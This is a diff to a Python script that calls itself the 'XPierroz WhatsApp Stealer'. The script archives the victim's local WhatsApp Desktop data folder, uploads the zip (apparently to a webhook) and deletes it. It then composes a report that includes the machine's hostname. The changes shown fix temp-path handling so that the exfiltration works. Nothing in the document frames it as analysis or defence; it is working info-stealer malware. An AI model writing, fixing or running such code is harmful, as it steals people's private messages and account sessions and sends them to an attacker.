@@ -4,9 +4,8 @@ import os, requests, time, socket, shutil
 
 WEBHOOK = "xpierroz and darknosy on top"
 
-temp = os.getenv("TEMP")
+temp = "C:\Temp"
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
-live = "temp"
 
 def upload(path):
     for x in range(10):
@@ -24,14 +23,13 @@ def upload(path):
 
 def l_om_est_eclate():
     try:
-        os.systemtemp
         #shutil.make_archive("ssouput", "zip", direct)
-        shutil.make_archive(os.path.join(live, "ssoutput"), "zip", direct)
+        shutil.make_archive(os.path.join(temp, "ssouput"), "zip", direct)
     except Exception:
         pass
     
-    m = upload(f"{os.getcwd()}\\ssouput.zip")
-    os.remove(f"{os.getcwd()}\\ssouput.zip")
+    m = upload(f"{temp}\\ssouput.zip")
+    os.remove(f"{temp}\\ssouput.zip")
     
     message = f"**XPierroz WhatsApp Stealer Report**\n\n"
     message += f"🖥️ Pc: {socket.gethostname()}\n"
